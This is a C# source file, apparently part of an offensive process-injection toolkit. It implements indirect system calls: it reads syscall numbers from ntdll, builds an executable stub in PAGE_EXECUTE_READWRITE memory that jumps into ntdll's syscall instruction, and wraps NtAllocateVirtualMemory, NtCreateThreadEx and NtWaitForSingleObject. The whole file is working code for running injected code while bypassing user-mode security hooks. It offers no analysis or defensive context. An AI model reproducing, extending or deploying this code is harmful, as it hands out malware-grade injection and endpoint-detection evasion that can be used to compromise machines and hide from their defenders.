using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static ProcessInjection.Native.Structs;
using static ProcessInjection.Native.Enum;
using ProcessInjection.Native;

namespace ProcessInjection.IndirectSyscalls
{
    public class IndirectSyscalls
    {
        static IntPtr ntdllBaseAddress = IntPtr.Zero;

        public static readonly byte[] X64IndirectSyscallStub =
        {
            0x49, 0x89, 0xCA,               			                // mov r10, rcx
            0xB8, 0x00, 0x00, 0x00, 0x00,    	              	        // mov eax, ssn
            0x49, 0xBB, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // movabs r11, address
            0x41, 0xFF, 0xE3 				       	                    // jmp r11
        };

        public static IntPtr NtDllBaseAddress
        {
            get
            {
                if (ntdllBaseAddress == IntPtr.Zero)
                    ntdllBaseAddress = GetNtdllBaseAddress();
                return ntdllBaseAddress;
            }
        }
        public static IntPtr GetNtdllBaseAddress()
        {
            Process hProc = Process.GetCurrentProcess();

            foreach (ProcessModule m in hProc.Modules)
            {
                if (m.ModuleName.ToUpper().Equals("NTDLL.DLL"))
                    return m.BaseAddress;
            }
            return IntPtr.Zero;
        }

        public static byte[] GetSysCallStub(string FunctionName)
        {
            var stub = X64IndirectSyscallStub;
            var funcAddress = Win32API.GetProcAddress(NtDllBaseAddress, FunctionName);
            var syscalladdress = BitConverter.GetBytes((long)funcAddress + 18);

            byte[] instructionBytes = new byte[10]; // Allocate space for the instruction bytes
            Marshal.Copy(funcAddress, instructionBytes, 0, instructionBytes.Length);

            var syscallnumber = (byte)(instructionBytes[4]);
            X64IndirectSyscallStub[4] = syscallnumber;
            Buffer.BlockCopy(syscalladdress, 0, stub, 10, syscalladdress.Length);
            return stub;

        }

        public static NTSTATUS NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect)
        {
            // set byte array of bNtAllocateVirtualMemory to new byte array called syscall
            byte[] syscall = GetSysCallStub("NtAllocateVirtualMemory");

            // specify unsafe context
            unsafe
            {
                // create new byte pointer and set value to our syscall byte array
                fixed (byte* ptr = syscall)
                {
                    // cast the byte array pointer into a C# IntPtr called memoryAddress
                    IntPtr memoryAddress = (IntPtr)ptr;

                    // Change memory access to RX for our assembly code
                    if (!Win32API.VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)MemProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    // Get delegate for NtAllocateVirtualMemory
                    Delegates.NtAllocateVirtualMemory assembledFunction = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtAllocateVirtualMemory));

                    return (NTSTATUS)assembledFunction(
                        ProcessHandle,
                        ref BaseAddress,
                        ZeroBits,
                        ref RegionSize,
                        AllocationType,
                        Protect);
                }
            }
        }

        public static NTSTATUS NtCreateThreadEx(
            out IntPtr hThread,
            ACCESS_MASK DesiredAccess,
            IntPtr ObjectAttributes,
            IntPtr ProcessHandle,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            bool CreateSuspended,
            uint StackZeroBits,
            uint SizeOfStackCommit,
            uint SizeOfStackReserve,
            IntPtr lpBytesBuffer
            )
        {
            // set byte array of bNtCreateThread to new byte array called syscall
            byte[] syscall = GetSysCallStub("NtCreateThreadEx");

            // specify unsafe context
            unsafe
            {
                // create new byte pointer and set value to our syscall byte array
                fixed (byte* ptr = syscall)
                {
                    // cast the byte array pointer into a C# IntPtr called memoryAddress
                    IntPtr memoryAddress = (IntPtr)ptr;

                    // Change memory access to RX for our assembly code
                    if (!Win32API.VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)MemProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    // Get delegate for NtCreateThread
                    Delegates.NtCreateThreadEx assembledFunction = (Delegates.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtCreateThreadEx));

                    return (NTSTATUS)assembledFunction(
                        out hThread,
                        DesiredAccess,
                        ObjectAttributes,
                        ProcessHandle,
                        lpStartAddress,
                        lpParameter,
                        CreateSuspended,
                        StackZeroBits,
                        SizeOfStackCommit,
                        SizeOfStackReserve,
                        lpBytesBuffer
                        );
                }
            }
        }

        public static NTSTATUS NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout)
        {
            // set byte array of bNtWaitForSingleObject to new byte array called syscall
            byte[] syscall = GetSysCallStub("NtWaitForSingleObject");

            // specify unsafe context
            unsafe
            {
                // create new byte pointer and set value to our syscall byte array
                fixed (byte* ptr = syscall)
                {
                    // cast the byte array pointer into a C# IntPtr called memoryAddress
                    IntPtr memoryAddress = (IntPtr)ptr;

                    // Change memory access to RX for our assembly code
                    if (!Win32API.VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)MemProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    // Get delegate for NtWaitForSingleObject
                    Delegates.NtWaitForSingleObject assembledFunction = (Delegates.NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtWaitForSingleObject));

                    return (NTSTATUS)assembledFunction(Object, Alertable, Timeout);
                }
            }
        }
    }
}
